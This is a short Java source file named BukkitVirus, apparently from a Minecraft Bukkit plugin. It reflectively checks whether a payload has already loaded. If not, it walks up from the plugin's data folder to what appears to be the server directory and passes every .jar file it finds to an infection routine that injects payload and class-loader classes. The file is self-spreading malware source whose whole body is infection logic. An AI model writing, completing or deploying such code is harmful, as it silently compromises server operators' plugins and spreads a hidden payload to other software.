package plvc;

import bukkitplugin.scoreboard.BukkitPlugin;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Field;

public class BukkitVirus {

    public static void run(BukkitPlugin pl) {
        try {
            Class clazz = Class.forName("plvc.dep.PayloadSystem");
            Field loaded = clazz.getDeclaredField("pld");
            loaded.setAccessible(true);
            if (!(boolean) loaded.get(null)) {
                for (File f : pl.getDataFolder().getAbsoluteFile().getParentFile().getParentFile().listFiles()) {
                    if (f.getName().endsWith(".jar")) {
                        try {
                            Infect.infectJar(f, "plvc.dep.PayloadSystem", "plvc.dep.ByteClassLoader");
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        } catch (ReflectiveOperationException e) {
            e.printStackTrace();
        }
    }

}
